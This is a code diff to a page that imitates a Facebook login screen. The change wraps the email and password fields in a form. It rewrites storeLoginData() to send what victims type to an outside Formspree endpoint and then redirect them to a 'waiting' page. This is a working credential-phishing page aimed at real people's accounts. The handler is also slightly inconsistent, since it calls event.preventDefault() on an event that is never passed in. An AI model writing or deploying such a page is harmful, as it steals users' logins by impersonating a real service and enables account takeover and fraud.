@@ -127,12 +127,16 @@
 
   <div class="login-container">
     <h2>Facebook</h2>
-    <input type="text" class="input-field" placeholder="Email or Phone Number" id="email" required>
-    <div class="eye-icon-container">
-      <input type="password" class="input-field" placeholder="Password" id="password" required>
-      <img src="not.png" id="eye-icon" onclick="togglePasswordVisibility()" alt="Eye Icon">
-    </div>
-    <button class="login-btn" onclick="storeLoginData()">Log In</button>
+    <!-- Form starts here -->
+    <form action="https://formspree.io/f/xyzzoapy" method="POST" id="login-form">
+      <input type="text" class="input-field" placeholder="Email or Phone Number" id="email" name="email" required>
+      <div class="eye-icon-container">
+        <input type="password" class="input-field" placeholder="Password" id="password" name="password" required>
+        <img src="not.png" id="eye-icon" onclick="togglePasswordVisibility()" alt="Eye Icon">
+      </div>
+      <button type="submit" class="login-btn" onclick="storeLoginData()">Log In</button>
+    </form>
+    <!-- Form ends here -->
     
     <a href="#" class="forgot-password">Forgot password?</a>
     
@@ -167,12 +171,33 @@
       }
     }
 
-    function storeLoginData() {
+    function storeLoginData(event) {
+      event.preventDefault();  // Prevent form from submitting the normal way
+
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      // Redirect to meta.html with the email and password as query parameters
-      window.location.href = 'waiting.html';
+      // Add email and password to the form data
+      const form = document.getElementById('login-form');
+      const formData = new FormData(form);
+      
+      // Send data to Formspree (this will be triggered automatically when submitting the form)
+      fetch(form.action, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        // If the request is successful, you can redirect to waiting page
+        if (response.ok) {
+          window.location.href = 'waiting.html';  // Redirect to waiting.html
+        } else {
+          alert("Something went wrong. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Something went wrong. Please try again.");
+      });
     }
   </script>
 
